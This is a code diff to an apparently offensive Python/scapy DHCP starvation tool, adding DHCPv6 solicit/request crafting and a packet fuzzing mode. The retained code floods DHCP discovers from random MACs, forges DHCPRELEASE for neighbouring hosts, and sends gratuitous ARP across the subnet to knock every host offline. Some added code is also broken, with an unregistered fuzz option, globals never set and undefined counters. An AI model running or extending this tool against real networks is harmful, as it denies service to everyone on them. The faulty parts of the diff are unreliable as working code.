@@ -10,6 +10,10 @@ Options:
     -d, --debug            ... enable scapy verbose output
     -h, --help             <- you are here :)
     
+    -6, --ipv6             ... DHCPv6 (off, DHCPv4 by default)
+    
+    -f, --fuzz             ... randomly fuzz packets (off)
+    
     -a, --show-arp         ... detect/print arp who_has (off)
     -i, --show-icmp        ... detect/print icmps requests (off)
     -o, --show-options     ... print lease infos (off)
@@ -30,6 +34,8 @@ conf.verb = False
 show_arp = False
 show_icmp = False
 show_options = False
+MODE_IPv6 = False
+MODE_FUZZ = False
 timeout={}
 timeout['dos']=8        #todo(tintinweb): add these values to getopt
 timeout['dhcpip']=2
@@ -37,7 +43,7 @@ timeout['timer']=0.4
 
 def checkArgs():
     try:
-        opts, args = getopt.getopt(sys.argv[1:], "hdaiox:y:z:")
+        opts, args = getopt.getopt(sys.argv[1:], "hdaiox:y:z:6")
     except getopt.GetoptError, err:
         # print help information and exit:
         print str(err) # will print something like "option -a not recognized"
@@ -61,6 +67,10 @@ def checkArgs():
             timeout['dos']=float(a)
         elif o in ("-z", "--timeout-dhcpequest"):
             timeout['dhcpip']=float(a)
+        elif o in ("-6", "--ipv6"):
+            MODE_IPv6=True
+        elif o in ("-f", "--fuzz"):
+            MODE_FUZZ=True
         else:
             assert False, "unhandled option"
     if len(args)==1:
@@ -129,7 +139,50 @@ def unpackMAC(binmac):
     return ':'.join(blocks)
 
 
+##########################################################
+#
+#  IPv6 Packet crafting
+#
 
+"""
+    protocol specific stuff
+
+c2s -> solicit
+s2c -> advertise 
+c2s -> request
+s2c -> reply
+
+"""
+
+def v6_build_ether(mac):
+    IPv6mcast="33:33:00:01:00:02"
+    IPv6LL="fe80::20c:29ff:fe6b:bf5e"
+    IPv6bcast="ff02::1:2"
+    IPv6DHCP_CLI_Port=546
+    IPv6DHCP_SRV_Port=547
+    ethead=Ether(src=mac,dst=IPv6mcast)/IPv6(src=IPv6LL,dst=IPv6bcast)/UDP(sport=IPv6DHCP_CLI_Port,dport=IPv6DHCP_SRV_Port)
+    return ethead
+
+def v6_build_discover(mac,trid=None):
+    ethead=v6_build_ether(mac)
+    trid=trid or random.randint(0x00,0xffffff)
+    cli_id=DHCP6OptClientId(duid=DUID_LLT(lladdr=mac,timeval=int(time.time())))
+    dhcp_discover = ethead/DHCP6_Solicit(trid=trid)/cli_id/DHCP6OptIA_NA(iaid=0xf)/DHCP6OptRapidCommit()/DHCP6OptElapsedTime()/DHCP6OptOptReq(reqopts=[23,24])
+    return dhcp_discover
+
+def v6_build_request(p_advertise,iaid=0xf,trid=None,options=[23,24]):
+    trid=trid or random.randint(0x00,0xffffff)
+    ethead=v6_build_ether(p_advertise[Ether].dst)
+    srv_id=DHCP6OptServerId(duid=p_advertise[DHCP6OptServerId].duid)
+    cli_id=p_advertise[DHCP6OptClientId]
+    iana=DHCP6OptIA_NA(ianaopts=p_advertise[DHCP6OptIA_NA].ianaopts, iaid=iaid)
+    dhcp_request=ethead/DHCP6_Request(trid=trid)/cli_id/srv_id/iana/DHCP6OptElapsedTime()/DHCP6OptOptReq( reqopts=[23,24])
+    return dhcp_request
+
+def sendPacket(pkt):
+    if MODE_FUZZ:
+        pkt = fuzz(pkt)
+    sendp(pkt)
 
 ##########################################################
 #
@@ -138,41 +191,50 @@ def unpackMAC(binmac):
 def neighbors():
     global dhcpsip,subnet,nodes
     nodes={}
-    m=randomMAC()
-    net=dhcpsip+"/"+calcCIDR(subnet)
-    ans,unans = srp(Ether(src=m,dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=net,psrc=dhcpsip), timeout=8,
-                    filter="arp and arp[7] = 2")
-    for request,reply in ans:
-        nodes[reply.hwsrc]=reply.psrc
-        print "%15s - %s " % (reply.psrc, reply.hwsrc)
+    if MODE_IPv6:
+        print "[ !! ] IPv6 - neighbors() not supported at this point "
+    else:
+        m=randomMAC()
+        net=dhcpsip+"/"+calcCIDR(subnet)
+        ans,unans = srp(Ether(src=m,dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=net,psrc=dhcpsip), timeout=8,
+                        filter="arp and arp[7] = 2")
+        for request,reply in ans:
+            nodes[reply.hwsrc]=reply.psrc
+            print "%15s - %s " % (reply.psrc, reply.hwsrc)
 
 #
 # send release for our neighbors
 #
 def release():
     global dhcpsmac,dhcpsip,nodes
-    print "***  Sending DHCPRELEASE for neighbors "
-    myxid=random.randint(1, 900000000)
-    #
-    #iterate over all ndoes and release their IP from DHCP server
-    for cmac,cip in nodes.iteritems():
-        dhcp_release = Ether(src=cmac,dst=dhcpsmac)/IP(src=cip,dst=dhcpsip)/UDP(sport=68,dport=67)/BOOTP(ciaddr=cip,chaddr=[mac2str(cmac)],xid=myxid,)/DHCP(options=[("message-type","release"),("server_id",dhcpsip),("client_id",chr(1),mac2str(cmac)),"end"])
-        sendp(dhcp_release)
-        print "Releasing %s - %s"%(cmac,cip)
-        if conf.verb: print "%r"%dhcp_release
+    if MODE_IPv6:
+        print "[ !! ] IPv6 - release() not supported at this point "
+    else:
+        print "***  Sending DHCPRELEASE for neighbors "
+        myxid=random.randint(1, 900000000)
+        #
+        #iterate over all ndoes and release their IP from DHCP server
+        for cmac,cip in nodes.iteritems():
+            dhcp_release = Ether(src=cmac,dst=dhcpsmac)/IP(src=cip,dst=dhcpsip)/UDP(sport=68,dport=67)/BOOTP(ciaddr=cip,chaddr=[mac2str(cmac)],xid=myxid,)/DHCP(options=[("message-type","release"),("server_id",dhcpsip),("client_id",chr(1),mac2str(cmac)),"end"])
+            sendPacket(dhcp_release)
+            print "Releasing %s - %s"%(cmac,cip)
+            if conf.verb: print "%r"%dhcp_release
 
 #
 #now knock everyone offline
 #
 def garp():
     global dhcpsip,subnet
-    pool=Net(dhcpsip+"/"+calcCIDR(subnet))
-    for ip in pool:
-        m=randomMAC()
-        arpp =  Ether(src=m,dst="ff:ff:ff:ff:ff:ff")/ARP(hwsrc=m,psrc=ip,hwdst="00:00:00:00:00:00",pdst=ip)
-        sendp(arpp)
-        print "Knocking %s offline, goodbye"%ip
-        if conf.verb: print "%r"%arpp
+    if MODE_IPv6:
+        print "[ !! ] IPv6 - gratious_arp() not supported at this point "
+    else:
+        pool=Net(dhcpsip+"/"+calcCIDR(subnet))
+        for ip in pool:
+            m=randomMAC()
+            arpp =  Ether(src=m,dst="ff:ff:ff:ff:ff:ff")/ARP(hwsrc=m,psrc=ip,hwdst="00:00:00:00:00:00",pdst=ip)
+            sendPacket(arpp)
+            print "Knocking %s offline, goodbye"%ip
+            if conf.verb: print "%r"%arpp
 
 #
 # loop and send Discovers
@@ -188,9 +250,13 @@ class send_dhcp(threading.Thread):
             m=randomMAC()
             myxid=random.randint(1, 900000000)
             hostname=''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(8))
-            dhcp_discover =  Ether(src=m,dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=[mac2str(m)],xid=myxid)/DHCP(options=[("message-type","discover"),("hostname",hostname),"end"])
-            print "[--->] DHCP_Discover"
-            sendp(dhcp_discover)
+            if MODE_IPv6:
+                dhcp_discover=v6_build_discover(m,trid=myxid)
+                print "[--->] v6_DHCP_Discover [cid:%s]"%(repr(str(dhcp_discover[DHCP6OptClientId].duid)))
+            else:
+                dhcp_discover =  Ether(src=m,dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=[mac2str(m)],xid=myxid)/DHCP(options=[("message-type","discover"),("hostname",hostname),"end"])
+                print "[--->] DHCP_Discover"
+            sendPacket(dhcp_discover)
             time.sleep(timer)
 
 #
@@ -200,7 +266,10 @@ class send_dhcp(threading.Thread):
 class sniff_dhcp(threading.Thread):
     def __init__ (self):
         threading.Thread.__init__(self)
-        self.filter = "arp or icmp or (udp and src port 67 and dst port 68)"
+        if MODE_IPv6:
+            self.filter ="icmp6 or (udp and src port 547 and dst port 546)"
+        else:
+            self.filter = "arp or icmp or (udp and src port 67 and dst port 68)"
         self.kill_received = False
         self.dhcpcount=0
 
@@ -214,59 +283,80 @@ class sniff_dhcp(threading.Thread):
           
     def detect_dhcp(self,pkt):
         global dhcpsmac,dhcpsip,subnet,show_arp,show_options,show_icmp
-        if DHCP in pkt:
-            if pkt[DHCP] and pkt[DHCP].options[0][1] == 2:
-                self.dhcpcount=0
-                dhcpsip = pkt[IP].src
-                dhcpsmac = pkt[Ether].src
-                for opt in pkt[DHCP].options:
-                    if opt[0] == 'subnet_mask':
-                        subnet=opt[1]
-                        break
-                
-                myip=pkt[BOOTP].yiaddr
-                sip=pkt[BOOTP].siaddr
-                localxid=pkt[BOOTP].xid
-                localm=unpackMAC(pkt[BOOTP].chaddr)
-                myhostname=''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(8))
-                print "[<---] DHCP_Offer   " + pkt[Ether].src,sip + " IP: "+myip+" for MAC=["+pkt[Ether].dst+"]"
-
-                if show_options:
-                    b = pkt[BOOTP]
-                    print "\t* xid=%s"%repr(b.xid)
-                    print "\t* CIaddr=%s"%repr(b.ciaddr)        
-                    print "\t* YIaddr=%s"%repr(b.yiaddr)
-                    print "\t* SIaddr=%s"%repr(b.siaddr)
-                    print "\t* GIaddr=%s"%repr(b.giaddr)
-                    print "\t* CHaddr=%s"%repr(b.chaddr)
-                    print "\t* Sname=%s"%repr(b.sname)
-                    for o in pkt[DHCP].options:
-                        if isinstance(o,str):
-                            if o=="end": break        #supress spam paddings :)
-                            print "\t\t* ",repr(o)
-                        else:
-                            print "\t\t* ",o[0],o[1:]    
-                
-                dhcp_req = Ether(src=localm,dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=[mac2str(localm)],xid=localxid)/DHCP(options=[("message-type","request"),("server_id",sip),("requested_addr",myip),("hostname",myhostname),("param_req_list","pad"),"end"])
-                print "[--->] DHCP_Request "+myip
-                sendp(dhcp_req)
-            elif ICMP in pkt:
-                if pkt[ICMP].type==8:
-                    myip=pkt[IP].dst
-                    mydst=pkt[IP].src
-                    if show_icmp: print "[ <- ] ICMP_Request "+mydst+" for "+myip 
-                    icmp_req=Ether(src=randomMAC(),dst=pkt.src)/IP(src=myip,dst=mydst)/ICMP(type=0,id=pkt[ICMP].id,seq=pkt[ICMP].seq)/"12345678912345678912"
-                    if conf.verb: 
-                        print "%r"%icmp_req 
-                    #sendp(icmp_req)
-                    #print "ICMP response from "+myip+" to "+mydst 
-
-            elif ARP in pkt:
-                if pkt[ARP].op ==1:        #op=1 who has, 2 is at
-                    myip=pkt[ARP].pdst
-                    mydst=pkt[ARP].psrc
-                    if show_arp: print "[ <- ] ARP_Request " + myip+" from "+mydst
-                    #todo(tintinweb):answer arps?
+        if MODE_IPv6:
+            if DHCP6_Advertise in pkt:
+                if DHCP6OptIAAddress in pkt and DHCP6OptServerId in pkt:
+                    numlivepackets-=1
+                    numdhcpsuccessfull+=1
+                    self.numdhcpsuccessfull=numdhcpsuccessfull
+                    myip=pkt[DHCP6OptIAAddress].addr
+                    sip=repr(pkt[DHCP6OptServerId].duid.lladdr)
+                    cip=repr(pkt[DHCP6OptClientId].duid.lladdr)
+                    #localxid=pkt[BOOTP].xid
+                    #localm=unpackMAC(pkt[BOOTP].chaddr)
+                    myhostname=''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(8))
+            
+                    print("[<---] v6 ADVERTISE FROM [%s] -> [%s] - LEASE: IPv6[%s]"%(sip,cip,myip))
+                    dhcp_req=v6_build_request(pkt,options=range(30))
+                    sendPacket(dhcp_req)
+                      
+                    print "[--->] v6 ACK IPv6[%s]\n"%myip
+            elif ICMPv6ND_NS in pkt and ICMPv6NDOptSrcLLAddr in pkt and SHOW_ICMP:
+                print "[<---] v6 ICMP REQUEST FROM [%s] -> [%s]"%(pkt[ICMPv6NDOptSrcLLAddr].lladdr,pkt[ICMPv6ND_NS].tgt)           
+        else:
+            if DHCP in pkt:
+                if pkt[DHCP] and pkt[DHCP].options[0][1] == 2:
+                    self.dhcpcount=0
+                    dhcpsip = pkt[IP].src
+                    dhcpsmac = pkt[Ether].src
+                    for opt in pkt[DHCP].options:
+                        if opt[0] == 'subnet_mask':
+                            subnet=opt[1]
+                            break
+                    
+                    myip=pkt[BOOTP].yiaddr
+                    sip=pkt[BOOTP].siaddr
+                    localxid=pkt[BOOTP].xid
+                    localm=unpackMAC(pkt[BOOTP].chaddr)
+                    myhostname=''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(8))
+                    print "[<---] DHCP_Offer   " + pkt[Ether].src,sip + " IP: "+myip+" for MAC=["+pkt[Ether].dst+"]"
+    
+                    if show_options:
+                        b = pkt[BOOTP]
+                        print "\t* xid=%s"%repr(b.xid)
+                        print "\t* CIaddr=%s"%repr(b.ciaddr)        
+                        print "\t* YIaddr=%s"%repr(b.yiaddr)
+                        print "\t* SIaddr=%s"%repr(b.siaddr)
+                        print "\t* GIaddr=%s"%repr(b.giaddr)
+                        print "\t* CHaddr=%s"%repr(b.chaddr)
+                        print "\t* Sname=%s"%repr(b.sname)
+                        for o in pkt[DHCP].options:
+                            if isinstance(o,str):
+                                if o=="end": break        #supress spam paddings :)
+                                print "\t\t* ",repr(o)
+                            else:
+                                print "\t\t* ",o[0],o[1:]    
+                    
+                    dhcp_req = Ether(src=localm,dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=[mac2str(localm)],xid=localxid)/DHCP(options=[("message-type","request"),("server_id",sip),("requested_addr",myip),("hostname",myhostname),("param_req_list","pad"),"end"])
+                    print "[--->] DHCP_Request "+myip
+                    sendPacket(dhcp_req)
+                elif ICMP in pkt:
+                    if pkt[ICMP].type==8:
+                        myip=pkt[IP].dst
+                        mydst=pkt[IP].src
+                        if show_icmp: print "[ <- ] ICMP_Request "+mydst+" for "+myip 
+                        icmp_req=Ether(src=randomMAC(),dst=pkt.src)/IP(src=myip,dst=mydst)/ICMP(type=0,id=pkt[ICMP].id,seq=pkt[ICMP].seq)/"12345678912345678912"
+                        if conf.verb: 
+                            print "%r"%icmp_req 
+                        #sendPacket(icmp_req)
+                        #print "ICMP response from "+myip+" to "+mydst 
+    
+                elif ARP in pkt:
+                    if pkt[ARP].op ==1:        #op=1 who has, 2 is at
+                        myip=pkt[ARP].pdst
+                        mydst=pkt[ARP].psrc
+                        if show_arp: print "[ <- ] ARP_Request " + myip+" from "+mydst
+                        #todo(tintinweb):answer arps?
 
 
 #
